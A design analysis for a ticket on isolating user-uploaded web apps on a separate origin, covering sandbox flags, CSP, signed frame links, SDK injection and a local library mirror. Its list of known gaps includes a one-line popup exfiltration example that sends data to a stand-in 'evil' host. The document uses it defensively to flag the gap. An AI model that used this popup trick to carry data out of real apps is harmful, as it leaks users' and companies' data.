# Analysis — SHC-0003: App serving on its own origin

## Metadata

| Field               | Value                                                                                   |
|---------------------|-----------------------------------------------------------------------------------------|
| **Description**     | Serve each app's HTML from an origin separate from the platform, with the SDK injected first, a strict CSP, and a local library mirror. |
| **Ticket**          | SHC-0003                                                                                |
| **Endpoints**       | new: app document on the apps origin (`GET /` per app); changed: `GET /api/apps/{slug}` (gains the frame URL) |
| **Key classes**     | `AppController`, `AppRegistry`, `SecurityConfig`; frontend `AppFrame`, `AppHostPage`     |
| **Related classes** | `BuildPage`, `UploadPage` (previews), `frontend/src/main.tsx` (credentials comment)     |
| **Handoff**         | §4 Architecture, §4.1 App isolation (non-negotiable), §6.1 app serving, §6.3 SDK, §8.5 domains |
| **References**      | `.claude/docs/auth.md` (credentials in `localStorage`), `.claude/docs/mongodb.md`       |

---

# 1. Problem

## 1.1. What is the problem?
- Apps run today as `srcdoc` in a sandbox **without** `allow-same-origin`, so each one gets an *opaque*
  origin. That is safe, but `localStorage`, IndexedDB and cookies throw inside apps. The handoff says
  "anything that runs natively in a browser must work", and an uploaded app that uses `localStorage` breaks.
- There is nowhere to inject the SDK (`window.shitcloud`) or set the CSP, because the HTML never passes
  through a server on its way to the frame. SHC-0004 (Data API + bridge) needs both.
- Nothing stops an app from calling the internet (`fetch`, external `<img>`, CDN scripts). The handoff's
  hard rule is "no network calls out of the app": `connect-src 'none'`, and libraries only from a local mirror.

## 1.2. Why is it a problem? What may be problematic to implement?
- **Per-app origins need a wildcard domain** (`{slug}.apps.<domain>`). Railway supports wildcard
  custom domains (`*.example.com`, one level, on Cloudflare too). It needs a domain you own: two CNAMEs
  (wildcard + `_acme-challenge`) and a TXT for verification. **No domain is set up for ShitCloud today.** The
  services only have `*.up.railway.app` domains, and Railway-generated domains can't be wildcards.
  - Fallback (handoff §4.1): **one shared apps domain** separate from the platform. Apps are then isolated from
    the platform but **not from each other**: they share one `localStorage` on `test`, which the handoff accepts.
  - `up.railway.app` is on the Public Suffix List, so `apps-…`, `frontend-…` and `api-…` are separate *sites*.
    Cookies and storage can't leak between them through the parent domain.
- **The iframe can't send a bearer token.** A frame navigation is a plain GET with no `Authorization`
  header, and the platform deliberately uses no cookies. So app HTML on the apps origin is either public by
  URL, or protected by something in the URL itself (a short-lived signed link). Uploaded HTML can contain
  hard-coded company data (handoff §7.3 exists because of that), so "public by slug" leaks it to anyone who
  guesses a slug.
- **The apps origin must not become a second API.** If the `api` service also answers the apps domain,
  `/api/**` must be unreachable there and app documents unreachable on the API domain. Otherwise CORS
  assumptions break and an app could be framed from the wrong place.
- **CSP vs. real-world apps:**
  - Inline `<script>`/`<style>` must work (single-file apps).
  - Alpine's standard build needs `'unsafe-eval'` (it compiles expressions with `new Function`).
  - Tailwind's browser build generates CSS at runtime (inline styles).
  - `img-src`/`font-src` must allow `data:` and `blob:` for embedded assets and CSV downloads.
  - Everything that could carry data out must be closed: `connect-src`, `img-src`/`font-src` (external),
    `form-action`, `base-uri`.
- **Known remaining exfiltration paths:**
  - `allow-popups` (in the handoff's sandbox list) lets an app `window.open('https://evil/?data=…')`. CSP
    doesn't govern top-level navigations of a popup.
  - `allow-downloads` creates local files only, so it's harmless.

  The handoff accepts `allow-popups`. This must be written down as a known gap, not silently assumed closed.
- **`allow-same-origin` becomes safe only when the frame's origin is not the platform's.** The new frame
  must load a real URL on the apps origin. Adding `allow-same-origin` while it still uses `srcdoc` would
  hand the app the platform origin, and with it the Auth0 refresh token and the guest token in `localStorage`
  (`auth.md`). This ticket swaps both at once.
- **Previews (Build, Upload)** show HTML that isn't deployed yet, so it isn't in `_apps`. The handoff wants
  previews "in the same sandbox/origin model as production".
- **Local development** needs the same separation without DNS: `*.localhost` resolves to loopback in Chrome
  and Firefox, so `http://{slug}.apps.localhost:8080` gives real per-app origins locally for free.
- **SDK scope:** the bridge and `db`/`me()` are SHC-0004. This ticket needs only the injection mechanism and a
  minimal SDK that defines `window.shitcloud` without breaking apps that know nothing about it.

## 1.3. How the user would like to solve it
From the product roadmap and handoff:
- Settle the Railway wildcard-domain question; fallback is one shared apps domain on `test`.
- Serve app HTML from the apps origin with the SDK as the **first `<script>`**, CSP `connect-src 'none'`,
  sandbox `allow-scripts allow-same-origin allow-forms allow-modals allow-popups allow-downloads`, no
  `allow-top-navigation`.
- A minimal local library mirror (Alpine, Tailwind, Chart.js) so CSP doesn't break apps. The full mirror is SHC-0016.
- Security comes from browser mechanisms (origin, sandbox, CSP), never from the AI agent.

# 2. Context

## 2.1. Key context
- `AppFrame.tsx` renders `srcdoc` without `allow-same-origin`. Its comment explains why and points at this
  ticket. Used by `AppHostPage`, `BuildPage` (chat draft) and `UploadPage` (file preview).
- `AppHostPage` already shows a placeholder badge `{slug}.apps.shitcloud`.
- `GET /api/apps/{slug}` returns `{app, html}` and marks the app used.
- Railway `test`:
  - `api` → `api-test-27f4.up.railway.app`
  - `frontend` (nginx) → `frontend-test-7caa.up.railway.app`
  - `Mongo Single Replica`
- One Railway service can have several domains, all routed to its port; the app sees the `Host` header.
- CORS is registered only for `/api/**`, with origins from `CORS_ALLOWED_ORIGINS` (the GUI).
- Handoff §8.4 already plans `PLATFORM_DOMAIN` and `APPS_DOMAIN` variables.

## 2.2. Main flows

```
Browser: platform origin (frontend-…)              API (api-… + apps domain on the same service, or own service)
  │ GET /api/apps/{slug}   Bearer …  ───────────────▶ registry: marks used
  │◀── { app, frameUrl }  (frameUrl = apps origin + slug [+ short-lived signature])
  │
  │ <iframe src=frameUrl sandbox="allow-scripts allow-same-origin …">
  │        │ GET {frameUrl}  (no credentials) ────────▶ apps host only: verify link → load HTML
  │        │◀── HTML with <script>SDK</script> first,
  │        │     CSP: default-src 'self'; connect-src 'none'; frame-ancestors <platform>; …
  │        │ <script src="/_lib/alpine…">  ───────────▶ local mirror (same apps origin)
  │        │ fetch('https://x')  ✗ blocked by CSP
  │  postMessage bridge (SHC-0004) ◀──── window.shitcloud
```

## 2.3. Current state of things
- No apps origin, no SDK, no CSP, no library mirror.
- `allow-same-origin` is deliberately absent and must stay absent for every `srcdoc` frame.
- Sample apps and the excuse-roulette test app use only inline JS/CSS; none uses a CDN yet.

# 3. Options and recommendations for the open questions

## 3.1. Apps origin on `test`

| Option | + | − |
|---|---|---|
| **A. Wildcard custom domain** `*.apps.<your-domain>` (needs a domain you own + DNS records) | True per-app origins, as in production; apps can't read each other's storage | You need a domain and DNS access. ~30 min of setup and TLS issuance |
| **B. One shared Railway domain** (e.g. `apps-test-….up.railway.app`) (fallback) | Zero DNS work, available today | All apps share one origin on `test` (each other's `localStorage`). Accepted by the handoff for `test` |

Recommendation: **build for both**. The code takes an `APPS_ORIGIN` pattern (`https://{slug}.apps.example.com`
or `https://apps-test.up.railway.app/{slug}/`). **Start with B on `test`** unless you have a domain ready.
Locally, subdomain mode works through `*.apps.localhost`.

## 3.2. Who serves app documents
| Option | + | − |
|---|---|---|
| **The `api` service, with a second domain and routing by `Host`** (recommended) | One deployable (handoff: "single JAR"); reads `_apps` directly | Host-based routing must fence `/api/**` off from the apps host and vice versa |
| A new Railway service (same image, `apps` profile) | Physical separation | A second deployment of the same code to keep in sync; more Railway config |

## 3.3. Access to app HTML on the apps origin
| Option | + | − |
|---|---|---|
| **Short-lived signed link** (recommended): `GET /api/apps/{slug}` returns `frameUrl` with `?exp=…&sig=HMAC(slug,exp)`, valid ~5 min to *load*, so a running app is unaffected | Only signed-in users get working links; nothing guessable; no cookies | A reloaded frame after expiry needs a new link (the host page fetches one) |
| Public by slug | Simplest | Anyone with a slug reads the HTML, including hard-coded data in imported apps |

## 3.4. Previews (Build chat draft, Upload)
| Option | + | − |
|---|---|---|
| **Keep `srcdoc` with an opaque origin for drafts** (recommended for now) | Safe as today, no new endpoint | `localStorage`/CSP differ from production in preview; an app that relies on them only works after deploy |
| Serve drafts from the apps origin (`POST` draft → short-lived signed draft URL) | Preview = production | A draft store, more endpoints. Better done with the chat module (SHC-0008, "live preview in the same sandbox/origin model") |

## 3.5. CSP details
- Proposed: `default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:; font-src 'self' data:; media-src 'self' data: blob:; connect-src 'none';
  form-action 'none'; base-uri 'none'; frame-ancestors <platform origin>; object-src 'none'`.
- `'unsafe-eval'`: recommended **yes**. Alpine's standard build and many small libraries need it, and with
  `connect-src 'none'` evaluated code still can't reach the network.
- `form-action 'none'`: forms still work through JS `submit` handlers. A plain HTML form posting to a URL is
  blocked, and it couldn't work in this platform anyway.

## 3.6. Library mirror (minimal)
- Served from the apps origin under `/_lib/…`, bundled in the JAR, pinned versions, MIT-licensed:
  Alpine.js 3, Tailwind (browser build), Chart.js 4.
- An app references `/_lib/alpine.min.js`. Rewriting CDN URLs to the mirror is the import agent's job (SHC-0013).

# 4. Acceptance criteria (draft, finalized in Phase 2)
1. Opening an app loads it in an iframe whose origin is the apps origin, not the platform's.
   `document.domain` / `location.origin` inside the app show it.
2. Inside a deployed app, `localStorage` works (and is not the platform's: the platform's tokens are not visible).
3. `fetch('https://example.com')` and an external `<img>` inside an app are blocked by CSP (console error),
   and the app keeps running.
4. `window.shitcloud` exists before the app's first script runs. An app that ignores it works unchanged.
5. An app using `/_lib/alpine.min.js`, Tailwind and Chart.js from the mirror works.
6. Opening the app document URL without a valid signature (or after expiry) → 403/404. The API domain
   doesn't serve app documents, and the apps domain doesn't serve `/api/**`.
7. Framing an app from any page other than the platform is refused (`frame-ancestors`).
8. Build and Upload previews keep working (opaque `srcdoc`, no `allow-same-origin`).
9. Locally `npm run dev` serves apps on `http://{slug}.apps.localhost:8080`.

# 5. Test scenarios (for Phase 4)
- App document: signed link → 200 with CSP header and SDK first; bad/expired signature → 403; unknown slug → 404.
- Host fencing: the apps host can't reach `/api/me`; the API host can't serve app documents.
- `GET /api/apps/{slug}` returns a `frameUrl` for the configured mode (subdomain / path).
- SDK injection: inserted as the first script in the document for HTML with/without `<head>`, with a doctype,
  and for a fragment.
- Mirror: `/_lib/*` served on the apps host with long cache headers; not on the API host.
- `ControllerAuthorizationIT` still passes (the new controller declares its rule).

# 6. Risks
| Risk | Mitigation |
|---|---|
| Popups exfiltrate data via URL (`allow-popups`) | Documented as a known gap; revisit in SHC-0004 when data exists (option: drop `allow-popups`) |
| Host-based routing mistake exposes the API on the apps domain | Dedicated filter + tests for both directions |
| Wildcard DNS/TLS setup delays the ticket | Path mode (shared domain) works without it; subdomain mode is config |
| CSP breaks an existing sample app | Samples are checked in Phase 3; mirror covers the common libraries |
| `*.localhost` not resolving in some browser | Chrome/Firefox/Edge resolve it; fallback config uses path mode locally |

# 7. Out of scope
- The `postMessage` bridge, `shitcloud.db`, `shitcloud.me()` (SHC-0004).
- Draft previews on the apps origin (SHC-0008).
- Full library mirror and ZIP upload with assets (SHC-0016). CDN-URL rewriting on import (SHC-0013).

# 8. User decisions (Phase 1)

| # | Question | Decision |
|---|---|---|
| U1 | Apps origin on `test` | **Shared Railway domain** (option B). The code also supports the subdomain pattern, and locally `*.apps.localhost` |
| U2 | Who serves app documents | **The `api` service with a second domain**, routed by `Host`; each host fenced off from the other's paths |
| U3 | Access to app HTML on the apps origin | **Public by slug, for now.** The host page stays behind sign-in. The iframe URL opens for anyone who knows the slug (it was explained that a frame request carries no token). Accepted risk for `test`: imported apps with hard-coded data are readable by URL. Revisit before real company data lands, e.g. with signed links |
| U4 | Previews | **Keep opaque `srcdoc`** for Build and Upload drafts; drafts move to the apps origin with SHC-0008 |
| U5 | CSP `'unsafe-eval'` | Not asked; taking the recommendation (**allowed**, for Alpine). Can be changed at the Phase 2 gate |
